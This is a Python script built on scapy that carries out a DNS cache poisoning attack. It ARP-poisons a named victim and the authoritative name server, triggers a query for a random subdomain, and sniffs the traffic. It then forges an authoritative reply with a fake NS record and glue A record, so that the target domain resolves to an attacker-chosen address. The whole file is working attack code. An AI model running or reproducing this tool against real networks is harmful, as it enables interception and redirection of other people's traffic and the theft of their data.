import argparse
from scapy.all import ARP, Ether, sniff, sendp, send, IP, UDP, DNS, DNSQR, DNSRR
from vars import ccolors
import utils
from arppoison import arppoison
import sys

def silent(args):
    # ARP poison the vicitims (two way ARP poisoning)
    arppoison(args.victim, args.soaIP[0])

    # send query request to the victim
    args.randomSubdomain = utils.getRandomSubdomain() + args.targetDomain
    reqPkt = IP(dst=args.victim) / UDP(sport=123) / DNS(qr=0, qd=DNSQR(qname=args.randomSubdomain))
    send(reqPkt, verbose=False)

    global globalargs
    globalargs = args

    # listen for packets on all interfaces (expect query request from victim to authoritative DNS)
    sniff(prn=dnsSpoof)

def dnsSpoof(pkt):
    if not pkt.haslayer(DNSQR):
        sendp(pkt, verbose=False)
    else:
        if globalargs.randomSubdomain in pkt[DNS].qd.qname:
            # return the response to the victim (it will think its from the authoritative DNS)
            spoof_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                        UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                        DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                        ns=DNSRR(rrname=globalargs.targetDomain,  type='NS', rdata=globalargs.soaDomain[0], ttl=globalargs.ttl), \
                        ar=DNSRR(rrname=globalargs.soaDomain[0], type='A', rdata=globalargs.addressToForge, ttl=globalargs.ttl))
            send(spoof_pkt, verbose=False)
            print ccolors.OKGREEN + "Victim DNS poisoned...\n" + ccolors.NC + ccolors.WARNING + "Terminating..." + ccolors.NC
            sys.exit()
        #else:
            #sendp(pkt, verbose=False)


